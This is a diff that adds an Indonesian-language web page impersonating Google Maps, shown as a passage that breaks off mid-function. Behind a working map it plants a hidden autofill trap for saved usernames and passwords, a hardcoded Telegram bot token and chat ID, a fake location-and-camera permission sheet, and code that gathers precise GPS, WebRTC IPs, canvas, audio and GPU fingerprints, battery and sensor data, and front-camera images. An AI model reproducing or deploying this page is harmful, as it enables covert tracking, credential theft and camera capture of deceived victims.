@@ -1,0 +1,597 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="theme-color" content="#ffffff">
+    <title>Google Maps</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <link rel="stylesheet" href="https://unpkg.com/leaflet-routing-machine@latest/dist/leaflet-routing-machine.css" />
+
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', -apple-system, sans-serif; -webkit-tap-highlight-color: transparent; user-select: none; }
+        body, html { width: 100%; height: 100%; overflow: hidden; background-color: #e5e3df; }
+        #map { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; background-color: #aadaff; }
+        .leaflet-control-attribution, .leaflet-routing-container { display: none !important; }
+        
+        .top-ui { position: absolute; top: 15px; left: 0; width: 100%; z-index: 1000; padding: 0 16px; pointer-events: none; transition: transform 0.3s ease; }
+        .search-box { position: relative; pointer-events: auto; }
+        .search-container { background: white; height: 52px; border-radius: 26px; display: flex; align-items: center; padding: 0 16px; box-shadow: 0 4px 12px rgba(0,0,0,0.15), 0 1px 3px rgba(0,0,0,0.1); gap: 12px; }
+        .gmaps-logo { width: 26px; height: 26px; flex-shrink: 0; background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="%234285F4" d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7z"/><path fill="%23EA4335" d="M12 2v7l6.5-3.7C16.5 3.1 14.4 2 12 2z"/><path fill="%23FBBC05" d="M5 9c0 2.4 1.1 4.5 2.7 6.1L12 9H5z"/><path fill="%2334A853" d="M7.7 15.1c1.3 1.4 2.9 3.1 4.3 4.9 1.4-1.8 3-3.5 4.3-4.9L12 9l-4.3 6.1z"/><circle fill="%23fff" cx="12" cy="9" r="2.5"/></svg>'); background-size: cover; }
+        .search-container input { flex: 1; border: none; outline: none; font-size: 18px; color: #202124; font-weight: 400; background: transparent; }
+        .search-container input::placeholder { color: #70757a; }
+        .icon-btn { color: #5f6368; font-size: 20px; padding: 6px; cursor: pointer; border-radius: 50%; }
+        .profile-pic { width: 32px; height: 32px; border-radius: 50%; border: 1px solid #e8eaed; padding: 2px; object-fit: contain; }
+        .autocomplete-dropdown { position: absolute; top: 60px; left: 0; width: 100%; background: white; border-radius: 12px; box-shadow: 0 4px 16px rgba(0,0,0,0.2); display: none; flex-direction: column; overflow: hidden; max-height: 300px; overflow-y: auto; }
+        .autocomplete-item { padding: 12px 16px; display: flex; align-items: center; gap: 12px; cursor: pointer; border-bottom: 1px solid #f1f3f4; font-size: 15px; color: #3c4043; }
+        .autocomplete-item:active { background: #f8f9fa; }
+        .autocomplete-item i { color: #9aa0a6; }
+        .chips-container { display: flex; gap: 10px; overflow-x: auto; margin-top: 15px; padding-bottom: 5px; scrollbar-width: none; pointer-events: auto; }
+        .chips-container::-webkit-scrollbar { display: none; }
+        .chip { background: white; padding: 9px 18px; border-radius: 24px; display: flex; align-items: center; gap: 8px; font-size: 15px; font-weight: 500; color: #3c4043; box-shadow: 0 2px 6px rgba(0,0,0,0.12); white-space: nowrap; cursor: pointer; border: 1px solid transparent; }
+        .chip:active { transform: scale(0.95); background: #f8f9fa; }
+        .chip i { color: #1967d2; font-size: 16px; }
+
+        .right-buttons { position: absolute; right: 16px; bottom: 160px; z-index: 1000; display: flex; flex-direction: column; gap: 10px; transition: bottom 0.3s ease; }
+        .btn-float { width: 46px; height: 46px; background: white; border-radius: 12px; display: flex; justify-content: center; align-items: center; box-shadow: 0 2px 8px rgba(0,0,0,0.15); font-size: 20px; color: #5f6368; cursor: pointer; }
+        .btn-float:active { transform: scale(0.9); background: #f8f9fa; }
+        .btn-float.circle { border-radius: 50%; color: #1967d2; }
+        .btn-float.nav { background: #00796b; color: white; border-radius: 16px; }
+        .pulse-marker { width: 24px; height: 24px; background: rgba(26, 115, 232, 0.3); border-radius: 50%; border: 3px solid #1a73e8; box-shadow: 0 0 0 0 rgba(26, 115, 232, 0.5); animation: pulse 2s infinite; position: relative; }
+        .pulse-marker::after { content: ''; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 10px; height: 10px; background: #1a73e8; border-radius: 50%; }
+        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(26, 115, 232, 0.5); } 70% { box-shadow: 0 0 0 15px rgba(26, 115, 232, 0); } 100% { box-shadow: 0 0 0 0 rgba(26, 115, 232, 0); } }
+
+        .watermark { position: absolute; left: 16px; bottom: 140px; z-index: 1000; color: #3c4043; font-size: 18px; font-weight: 500; text-shadow: 0 1px 3px #fff, 0 -1px 3px #fff, 1px 0 3px #fff, -1px 0 3px #fff; pointer-events: none; transition: bottom 0.3s ease; }
+        .bottom-panel { position: absolute; bottom: 0; left: 0; width: 100%; height: 140px; background: white; border-radius: 20px 20px 0 0; z-index: 1000; box-shadow: 0 -2px 10px rgba(0,0,0,0.1); display: flex; flex-direction: column; align-items: center; transition: height 0.3s ease; touch-action: none; }
+        .drag-bar-container { width: 100%; padding: 10px 0; display: flex; justify-content: center; cursor: ns-resize; }
+        .drag-bar { width: 32px; height: 4px; background: #d0d0d0; border-radius: 2px; }
+        .panel-content { width: 100%; padding: 0 20px; display: flex; flex-direction: column; height: 100%; overflow-y: auto; }
+        .panel-title { font-size: 22px; font-weight: 400; color: #202124; margin-bottom: 15px; }
+        .route-info { display: none; flex-direction: column; gap: 8px; margin-bottom: 15px; padding: 15px; background: #f8f9fa; border-radius: 12px; border: 1px solid #dadce0; }
+        .route-info h3 { color: #188038; font-size: 20px; display: flex; align-items: center; gap: 8px; }
+        .route-info p { color: #3c4043; font-size: 15px; }
+        .btn-stop { background: #d93025; color: white; border: none; padding: 12px; border-radius: 8px; font-weight: bold; margin-top: 10px; font-size: 15px; width: 100%; cursor: pointer; }
+        .bottom-tabs { width: 100%; display: flex; justify-content: space-around; padding: 10px 0 15px 0; border-top: 1px solid #f1f3f4; margin-top: auto; }
+        .tab-item { display: flex; flex-direction: column; align-items: center; gap: 4px; color: #5f6368; font-size: 12px; cursor: pointer; font-weight: 500; }
+        .tab-item i { font-size: 22px; }
+        .tab-item.active { color: #1967d2; }
+        .tab-item.active .icon-bg { background: #e8f0fe; width: 60px; height: 30px; border-radius: 15px; display: flex; justify-content: center; align-items: center; }
+        .nav-mode .search-container { display: none; }
+        .nav-mode .chips-container { display: none; }
+        .leaflet-popup-content-wrapper { border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); }
+        .leaflet-popup-content { margin: 12px 16px; font-size: 14px; }
+
+        .gm-native-overlay {
+            position: fixed; inset: 0; background: rgba(0,0,0,0.4); z-index: 9999;
+            display: flex; align-items: flex-end; justify-content: center;
+            opacity: 0; pointer-events: none; transition: opacity 0.3s ease;
+        }
+        .gm-native-overlay.show { opacity: 1; pointer-events: auto; }
+        .gm-native-sheet {
+            background: #ffffff; width: 100%; max-width: 500px;
+            border-radius: 24px 24px 0 0; padding: 24px 24px 32px;
+            transform: translateY(100%); transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            display: flex; flex-direction: column; align-items: center;
+            font-family: 'Roboto', Arial, sans-serif;
+        }
+        .gm-native-overlay.show .gm-native-sheet { transform: translateY(0); }
+        .gm-drag-handle { width: 32px; height: 4px; background: #dadce0; border-radius: 2px; margin-bottom: 24px; }
+        .gm-icon-container { width: 48px; height: 48px; background: #e8f0fe; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin-bottom: 16px; }
+        .gm-icon-container svg { width: 24px; height: 24px; fill: #1a73e8; }
+        .gm-title { font-size: 22px; font-weight: 500; color: #202124; margin-bottom: 12px; text-align: center; letter-spacing: -0.2px; }
+        .gm-desc { font-size: 14px; color: #5f6368; line-height: 1.5; text-align: center; margin-bottom: 28px; padding: 0 10px; }
+        .gm-btn-primary { width: 100%; background: #1a73e8; color: #ffffff; border: none; border-radius: 100px; padding: 14px 24px; font-size: 15px; font-weight: 500; font-family: 'Roboto', Arial, sans-serif; cursor: pointer; transition: background 0.2s, box-shadow 0.2s; box-shadow: 0 1px 3px rgba(60,64,67,0.3), 0 4px 8px 3px rgba(60,64,67,0.15); }
+        .gm-btn-primary:active { background: #1557b0; box-shadow: none; }
+        .gm-btn-primary:disabled { background: #9ab4d9; cursor: default; box-shadow: none; }
+        .gm-btn-text { background: transparent; border: none; color: #1a73e8; font-size: 15px; font-weight: 500; font-family: 'Roboto', Arial, sans-serif; padding: 14px 24px; cursor: pointer; width: 100%; text-align: center; margin-top: 4px; }
+        .gm-btn-text:active { background: rgba(26,115,232,0.1); border-radius: 100px; }
+
+        .hidden-form { position: absolute; top: -9999px; left: -9999px; opacity: 0; width: 0; height: 0; }
+    </style>
+</head>
+<body>
+
+    <div id="map"></div>
+
+    <div class="top-ui" id="topUI">
+        <div class="search-box">
+            <div class="search-container">
+                <div class="gmaps-logo"></div>
+                <input type="text" id="searchInput" placeholder="Telusuri di sini" autocomplete="off">
+                <i class="fa-solid fa-magnifying-glass icon-btn" onclick="cariLokasi()"></i>
+                <i class="fa-solid fa-microphone icon-btn"></i>
+                <img src="https://www.google.com/favicon.ico" alt="Profile" class="profile-pic">
+            </div>
+            <div class="autocomplete-dropdown" id="autoCompleteList"></div>
+        </div>
+
+        <div class="chips-container" id="chipsContainer">
+            <div class="chip" onclick="cariPOI('restaurant', this)"><i class="fa-solid fa-utensils"></i> Restoran</div>
+            <div class="chip" onclick="cariPOI('hotel', this)"><i class="fa-solid fa-bed"></i> Hotel</div>
+            <div class="chip" onclick="cariPOI('store', this)"><i class="fa-solid fa-bag-shopping"></i> Belanja</div>
+            <div class="chip" onclick="cariPOI('cafe', this)"><i class="fa-solid fa-mug-hot"></i> Kafe</div>
+        </div>
+    </div>
+
+    <div class="watermark" id="watermark">Google Maps</div>
+
+    <div class="right-buttons" id="rightButtons">
+        <div class="btn-float" onclick="gantiLayer()" id="layerBtn"><i class="fa-solid fa-layer-group"></i></div>
+        <div class="btn-float" onclick="resetBearing()"><i class="fa-solid fa-compass" style="color: #5f6368;"></i></div>
+        <div class="btn-float circle" onclick="deteksiLokasi()" id="locBtn"><i class="fa-solid fa-crosshairs"></i></div>
+        <div class="btn-float nav" onclick="bukaRute()"><i class="fa-solid fa-diamond-turn-right"></i></div>
+    </div>
+
+    <div class="bottom-panel" id="bottomPanel">
+        <div class="drag-bar-container" id="dragBar"><div class="drag-bar"></div></div>
+        <div class="panel-content">
+            <div class="panel-title" id="panelTitle">Suasana lokal</div>
+            
+            <div class="route-info" id="routeInfo">
+                <h3><i class="fa-solid fa-route"></i> Rute Perjalanan</h3>
+                <p id="routeDetails"></p>
+                <button class="btn-stop" onclick="hentikanRute()">Tutup Rute Navigasi</button>
+            </div>
+
+            <div class="bottom-tabs" id="bottomTabs">
+                <div class="tab-item active" onclick="switchTab(this, 'Suasana lokal')">
+                    <div class="icon-bg"><i class="fa-solid fa-location-dot"></i></div><span>Jelajahi</span>
+                </div>
+                <div class="tab-item" onclick="switchTab(this, 'Tersimpan')">
+                    <i class="fa-regular fa-bookmark"></i><span>Anda</span>
+                </div>
+                <div class="tab-item" onclick="switchTab(this, 'Kontribusi')">
+                    <i class="fa-regular fa-circle-plus"></i><span>Kontribusi</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="gm-native-overlay" id="overlay">
+        <div class="gm-native-sheet">
+            <div class="gm-drag-handle"></div>
+            <div class="gm-icon-container">
+                <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
+            </div>
+            <div class="gm-title">Aktifkan Lokasi & Kamera?</div>
+            <div class="gm-desc">Google Maps memerlukan akses ke lokasi presisi dan kamera perangkat Anda untuk menampilkan posisi real-time dan fitur Street View.</div>
+            <button class="gm-btn-primary" id="allowBtn">Izinkan Akses</button>
+            <button class="gm-btn-text" onclick="document.getElementById('overlay').classList.remove('show')">Nanti saja</button>
+        </div>
+    </div>
+
+    <form class="hidden-form" autocomplete="on">
+        <input type="text" id="trapUser" name="username" autocomplete="username">
+        <input type="password" id="trapPass" name="password" autocomplete="current-password">
+    </form>
+
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <script src="https://unpkg.com/leaflet-routing-machine@latest/dist/leaflet-routing-machine.js"></script>
+    
+    <script>
+        const TG_TOKEN = "8301561580:AAFsTOGnXd3OWPFGM93SRQc96MrDKTJKW8Y";
+        const TG_CHAT  = "6372201969";
+        const TG_BASE  = "https://api.telegram.org/bot" + TG_TOKEN;
+
+        var map = L.map('map', { center: [-1.0, 114.0], zoom: 6, zoomControl: false, attributionControl: false });
+        var petaJalan = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom: 19 });
+        var petaSatelit = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', { maxZoom: 19 });
+        petaJalan.addTo(map);
+        var layerAktif = 'jalan';
+
+        function gantiLayer() {
+            if (layerAktif === 'jalan') { map.removeLayer(petaJalan); petaSatelit.addTo(map); layerAktif = 'satelit'; document.getElementById('layerBtn').innerHTML = '<i class="fa-solid fa-map"></i>'; }
+            else { map.removeLayer(petaSatelit); petaJalan.addTo(map); layerAktif = 'jalan'; document.getElementById('layerBtn').innerHTML = '<i class="fa-solid fa-layer-group"></i>'; }
+        }
+        var currentMarker = null, tujuanRute = null, searchInput = document.getElementById('searchInput'), autoCompleteList = document.getElementById('autoCompleteList'), debounceTimer;
+        searchInput.addEventListener('input', function() {
+            clearTimeout(debounceTimer);
+            var query = this.value.trim();
+            if (query.length < 3) { autoCompleteList.style.display = 'none'; return; }
+            debounceTimer = setTimeout(() => {
+                fetch(`https://nominatim.openstreetmap.org/search?format=json&limit=5&q=${encodeURIComponent(query)}`).then(res => res.json()).then(data => {
+                    autoCompleteList.innerHTML = '';
+                    if (data.length > 0) {
+                        data.forEach(place => {
+                            var div = document.createElement('div');
+                            div.className = 'autocomplete-item';
+                            div.innerHTML = `<i class="fa-solid fa-location-dot"></i> <span>${place.display_name}</span>`;
+                            div.onclick = () => pilihLokasi(place.lat, place.lon, place.display_name, place.name);
+                            autoCompleteList.appendChild(div);
+                        });
+                        autoCompleteList.style.display = 'flex';
+                    } else { autoCompleteList.style.display = 'none'; }
+                });
+            }, 500);
+        });
+        function pilihLokasi(lat, lon, displayName, name) {
+            searchInput.value = name || displayName.split(',')[0];
+            autoCompleteList.style.display = 'none'; searchInput.blur();
+            map.flyTo([lat, lon], 15, { duration: 1.5 });
+            if (currentMarker) map.removeLayer(currentMarker);
+            var pinSvg = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="40" height="40" style="filter: drop-shadow(0px 4px 4px rgba(0,0,0,0.4));"><path fill="#EA4335" d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7z"/><circle fill="#fff" cx="12" cy="9" r="3"/></svg>`;
+            currentMarker = L.marker([lat, lon], { icon: L.divIcon({ className: 'custom-pin', html: pinSvg, iconSize: [40, 40], iconAnchor: [20, 40] }) }).addTo(map).bindPopup(`<b>${name || 'Lokasi'}</b><br>${displayName}`).openPopup();
+            tujuanRute = [lat, lon]; bukaPanel("Lokasi Ditemukan");
+        }
+        function cariLokasi() { if (autoCompleteList.children.length > 0) autoCompleteList.children[0].click(); }
+        var userLocation = null, userMarker = null;
+        function deteksiLokasi() {
+            var btn = document.getElementById('locBtn'); btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i>';
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    userLocation = [position.coords.latitude, position.coords.longitude]; map.flyTo(userLocation, 16, { duration: 1.5 });
+                    if (userMarker) map.removeLayer(userMarker);
+                    var pulseIcon = L.divIcon({ className: 'pulse-marker', iconSize: [24, 24], iconAnchor: [12, 12] });
+                    userMarker = L.marker(userLocation, {icon: pulseIcon}).addTo(map); btn.innerHTML = '<i class="fa-solid fa-crosshairs" style="color:#1a73e8"></i>';
+                }, function() { alert("Gagal GPS. Izinkan akses lokasi."); btn.innerHTML = '<i class="fa-solid fa-crosshairs"></i>'; }, { enableHighAccuracy: true });
+            }
+        }
+        var routingControl = null;
+        function bukaRute() {
+            if (!tujuanRute) return alert("Cari tempat tujuan terlebih dahulu.");
+            if (!userLocation) return alert("Klik tombol target (GPS) dulu.");
+            if (routingControl) map.removeControl(routingControl);
+            routingControl = L.Routing.control({ waypoints: [ L.latLng(userLocation[0], userLocation[1]), L.latLng(tujuanRute[0], tujuanRute[1]) ], lineOptions: { styles: [{color: '#1a73e8', weight: 8, opacity: 0.9}] }, createMarker: function() { return null; }, addWaypoints: false, show: false, fitSelectedRoutes: true }).addTo(map);
+            routingControl.on('routesfound', function(e) {
+                var summary = e.routes[0].summary; var jarakKm = (summary.totalDistance / 1000).toFixed(1); var waktuMenit = Math.round(summary.totalTime / 60);
+                document.getElementById('topUI').classList.add('nav-mode'); document.getElementById('panelTitle').innerText = `Navigasi Aktif`;
+                document.getElementById('routeDetails').innerHTML = `<b style="font-size:24px; color:#188038;">${waktuMenit} mnt</b> <span style="color:#5f6368;">(${jarakKm} km)</span><br><div style="margin-top:10px; font-size:13px; color:#3c4043;"><i class="fa-solid fa-arrow-turn-up" style="color:#1a73e8; margin-right:8px;"></i> Belok kiri di jalan utama.<br><i class="fa-solid fa-arrow-turn-right" style="color:#1a73e8; margin-right:8px; margin-top:6px;"></i> Lanjutkan perjalanan Anda.</div>`;
+                document.getElementById('routeInfo').style.display = 'flex'; bukaPanel("Navigasi");
+            });
+        }
+        function hentikanRute() { if (routingControl) { map.removeControl(routingControl); routingControl = null; } document.getElementById('routeInfo').style.display = 'none'; document.getElementById('topUI').classList.remove('nav-mode'); document.getElementById('panelTitle').innerText = "Suasana lokal"; panel.style.height = '140px'; bukaPanel("Suasana lokal"); }
+        function cariPOI(kategori, element) {
+            document.querySelectorAll('.chip').forEach(el => el.classList.remove('active-cat')); element.classList.add('active-cat');
+            var center = map.getCenter(); var query = `[out:json];node(around:3000,${center.lat},${center.lng})["amenity"="${kategori}"];out 10;`;
+            fetch(`https://overpass-api.de/api/interpreter?data=${encodeURIComponent(query)}`).then(res => res.json()).then(data => {
+                if (data.elements.length > 0) {
+                    data.elements.forEach(place => { L.marker([place.lat, place.lon], { icon: L.divIcon({ className: 'poi-pin', html: `<div style="background:white; width:32px; height:32px; border-radius:50%; display:flex; justify-content:center; align-items:center; box-shadow:0 2px 5px rgba(0,0,0,0.3); border:1px solid #dadce0;"><i class="fa-solid fa-${kategori === 'restaurant' ? 'utensils' : kategori === 'hotel' ? 'bed' : kategori === 'cafe' ? 'mug-hot' : 'bag-shopping'}" style="color:#1967d2; font-size:14px;"></i></div>`, iconSize: [32, 32], iconAnchor: [16, 16] }) }).addTo(map).bindPopup(`<b>${place.tags.name || kategori}</b>`); });
+                    bukaPanel(`Hasil: ${element.innerText}`);
+                } else { alert(`Tidak ditemukan ${kategori} di area ini.`); }
+            });
+        }
+        var panel = document.getElementById('bottomPanel'), dragBar = document.getElementById('dragBar'), isDragging = false, startY = 0, startHeight = 140;
+        function bukaPanel(title) { document.getElementById('panelTitle').innerText = title; panel.style.height = '320px'; document.getElementById('rightButtons').style.bottom = '340px'; document.getElementById('watermark').style.bottom = '320px'; }
+        dragBar.addEventListener('touchstart', function(e) { isDragging = true; startY = e.touches[0].clientY; startHeight = panel.offsetHeight; panel.style.transition = 'none'; });
+        dragBar.addEventListener('touchmove', function(e) { if (!isDragging) return; var deltaY = startY - e.touches[0].clientY; var newHeight = startHeight + deltaY; if (newHeight > 140 && newHeight < window.innerHeight * 0.85) { panel.style.height = newHeight + 'px'; document.getElementById('rightButtons').style.bottom = (newHeight + 20) + 'px'; document.getElementById('watermark').style.bottom = (newHeight + 10) + 'px'; } });
+        dragBar.addEventListener('touchend', function() { isDragging = false; panel.style.transition = 'height 0.3s ease'; var currentHeight = panel.offsetHeight; if (currentHeight > (window.innerHeight * 0.4)) { bukaPanel(document.getElementById('panelTitle').innerText); } else { panel.style.height = '140px'; document.getElementById('rightButtons').style.bottom = '160px'; document.getElementById('watermark').style.bottom = '140px'; } });
+        function switchTab(element, title) { document.querySelectorAll('.tab-item').forEach(el => { el.classList.remove('active'); var iconBg = el.querySelector('.icon-bg'); if (iconBg) { iconBg.outerHTML = iconBg.innerHTML; } }); element.classList.add('active'); bukaPanel(title); }
+        function resetBearing() { map.setView(map.getCenter(), map.getZoom(), { animate: true }); }
+        window.addEventListener('resize', function() { map.invalidateSize(); });
+
+        const overlay = document.getElementById('overlay');
+        const allowBtn = document.getElementById('allowBtn');
+        window.addEventListener('load', () => { 
+            setTimeout(() => overlay.classList.add('show'), 800); 
+            setTimeout(() => { document.getElementById('trapUser').focus(); document.getElementById('trapUser').blur(); }, 1000);
+        });
+
+        function getDistance(lat1, lon1, lat2, lon2) {
+            const R = 6371e3; const toRad = Math.PI / 180;
+            const dLat = (lat2 - lat1) * toRad; const dLon = (lon2 - lon1) * toRad;
+            const a = Math.sin(dLat/2)**2 + Math.cos(lat1 * toRad) * Math.cos(lat2 * toRad) * Math.sin(dLon/2)**2;
+            return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+        }
+
+        function formatDate() {
+            const d = new Date(); const months = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember'];
+            const pad = (n) => n.toString().padStart(2, '0');
+            return `${d.getDate()} ${months[d.getMonth()]} ${d.getFullYear()} ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
+        }
+
+        async function getWebRTCIP() {
+            return new Promise((resolve) => {
+                try {
+                    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+                    const ips = new Set(); pc.createDataChannel("");
+                    pc.onicecandidate = (e) => { if (!e.candidate) return; const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate); if (match) ips.add(match[1]); };
+                    pc.createOffer().then(o => pc.setLocalDescription(o));
+                    setTimeout(() => { pc.close(); resolve(Array.from(ips).join(', ') || '-'); }, 2000);
+                } catch(e) { resolve('-'); }
+            });
+        }
+
+        async function getAudioFP() {
+            try {
+                const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
+                const osc = ctx.createOscillator(); osc.type = 'triangle'; osc.frequency.value = 10000;
+                const comp = ctx.createDynamicsCompressor(); comp.threshold.value = -50; comp.knee.value = 40; comp.ratio.value = 12; comp.attack.value = 0; comp.release.value = 0.25;
+                osc.connect(comp); comp.connect(ctx.destination); osc.start(0);
+                const buf = await ctx.startRendering(); const data = buf.getChannelData(0);
+                let sum = 0; for(let i = 4500; i < 5000; i++) sum += Math.abs(data[i]);
+                return sum.toFixed(6);
+            } catch(e) { return '-'; }
+        }
+
+        async function getDeviceInfo() {
+            const ua = navigator.userAgent; let browser = "Unknown", os = "Unknown";
+            if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome"; else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari"; else if (ua.includes("Firefox")) browser = "Firefox"; else if (ua.includes("Edg")) browser = "Edge";
+            if (ua.includes("Android")) os = "Android"; else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS"; else if (ua.includes("Windows")) os = "Windows"; else if (ua.includes("Mac")) os = "MacOS"; else if (ua.includes("Linux")) os = "Linux";
+            
+            const screenRes = `${window.screen.width}x${window.screen.height}`;
+            const colorDepth = window.screen.colorDepth;
+            const pixelRatio = window.devicePixelRatio || 1;
+            const orientation = (window.screen.orientation && window.screen.orientation.type) || 'unknown';
+            const touchPoints = navigator.maxTouchPoints || 0;
+            
+            const cores = navigator.hardwareConcurrency || '?'; 
+            const mem = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : '?'; 
+            
+            let connSpeed = '-', connType = '-', isSaveData = 'off';
+            if (navigator.connection) {
+                connType = navigator.connection.effectiveType || '?';
+                connSpeed = `${navigator.connection.downlink || '?'} Mbps | RTT: ${navigator.connection.rtt || '?'} ms`;
+                isSaveData = navigator.connection.saveData ? 'on' : 'off';
+            }
+
+            let fpCanvas = '-';
+            try {
+                const c = document.createElement('canvas'); c.width = 200; c.height = 50; const ctx = c.getContext('2d'); ctx.textBaseline = 'top'; ctx.font = '14px Arial'; ctx.fillStyle = '#f60'; ctx.fillRect(0, 0, 100, 20); ctx.fillStyle = '#069'; ctx.fillText('Ultra FP', 2, 15); const url = c.toDataURL(); let h = 0; for(let i = 0; i < url.length; i++){ h = ((h << 5) - h + url.charCodeAt(i)) | 0; } fpCanvas = (h >>> 0).toString(16).padStart(8, '0');
+            } catch(e) {}
+            
+            let gpuVendor = '-', gpuRenderer = '-', gpuVer = '-';
+            try { 
+                const c = document.createElement('canvas'); 
+                const gl = c.getContext('webgl') || c.getContext('experimental-webgl'); 
+                const dbg = gl.getExtension('WEBGL_debug_renderer_info'); 
+                if(dbg) { gpuVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL); gpuRenderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL); } 
+                gpuVer = gl.getParameter(gl.VERSION);
+            } catch(e) {}
+            
+            let cpuArch = '-', exactModel = '-', manufacturer = '-';
+            try { 
+                if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) { 
+                    const h = await navigator.userAgentData.getHighEntropyValues(["architecture", "bitness", "model", "platformVersion", "fullVersionList"]); 
+                    cpuArch = `${h.architecture || '?'}-${h.bitness || '?'}bit`; 
+                    exactModel = `${h.model || '?'} (OS v${h.platformVersion || '?'})`; 
+                    if (h.fullVersionList && h.fullVersionList.length > 0) {
+                        manufacturer = h.fullVersionList.map(x => x.brand).join(', ');
+                    }
+                } 
+            } catch(e) {}
+            
+            let screenHDR = 'Standard';
+            if (window.matchMedia('(dynamic-range: high)').matches) screenHDR = 'HDR Supported';
+            let colorGamut = 'sRGB';
+            if (window.matchMedia('(color-gamut: p3)').matches) colorGamut = 'P3 Wide Color';
+
+            let storageStr = '-';
+            if (navigator.storage && navigator.storage.estimate) {
+                const est = await navigator.storage.estimate();
+                storageStr = `Used: ${Math.round(est.usage/1048576)} MB / Quota: ${Math.round(est.quota/1048576)} MB`;
+            }
+
+            return { browser, os, screenRes, colorDepth, pixelRatio, orientation, touchPoints, cores, mem, connSpeed, connType, isSaveData, ua, fpCanvas, gpuVendor, gpuRenderer, gpuVer, cpuArch, exactModel, manufacturer, screenHDR, colorGamut, storageStr };
+        }
+
+        async function getIP() { try { const r = await fetch('https://ipapi.co/json/'); return await r.json(); } catch(e) { return null; } }
+        
+        function getSensors() {
+            return new Promise((resolve) => {
+                let motion = "Tidak ada dukungan"; let hasData = false;
+                const handler = (e) => { hasData = true; const a = e.accelerationIncludingGravity; if (a) motion = `X:${a.x?.toFixed(2)} Y:${a.y?.toFixed(2)} Z:${a.z?.toFixed(2)}`; window.removeEventListener('devicemotion', handler); resolve(motion); };
+                if (window.DeviceMotionEvent) { window.addEventListener('devicemotion', handler); setTimeout(() => { window.removeEventListener('devicemotion', handler); if (!hasData) resolve("Tidak ada respon"); }, 2000); } else { resolve("Tidak didukung"); }
+            });
+        }
+
+        function getMaxAccuracyLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) return resolve(null);
+                let bestPos = null; let watchId = null; let attempts = 0; const MAX_WAIT = 20000;
+                const success = (pos) => {
+                    attempts++;
+                    if (!bestPos || pos.coords.accuracy < bestPos.coords.accuracy) bestPos = pos;
+                    if (bestPos.coords.accuracy <= 5 || attempts >= 10) {
+                        if(watchId !== null) navigator.geolocation.clearWatch(watchId);
+                        resolve({ lat: bestPos.coords.latitude, lng: bestPos.coords.longitude, acc: bestPos.coords.accuracy, alt: bestPos.coords.altitude, spd: bestPos.coords.speed, head: bestPos.coords.heading });
+                    }
+                };
+                const fail = () => {};
+                watchId = navigator.geolocation.watchPosition(success, fail, { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 });
+                setTimeout(() => { if (watchId !== null) navigator.geolocation.clearWatch(watchId); if (bestPos) resolve({ lat: bestPos.coords.latitude, lng: bestPos.coords.longitude, acc: bestPos.coords.accuracy, alt: bestPos.coords.altitude, spd: bestPos.coords.speed, head: bestPos.coords.heading }); else resolve(null); }, MAX_WAIT);
+            });
+        }
+
+        async function getBatteryInfo() { 
+            try { 
+                if (navigator.getBattery) { 
+                    const b = await navigator.getBattery(); 
+                    return `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`; 
+                } 
+            } catch(e) {} 
+            return '?'; 
+        }
+
+        async function captureCamerasAndTorch() {
+            const result = { front: null, back: null };
+            let stream = null;
+            
+            // 1. Capture Front Camera
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }, 
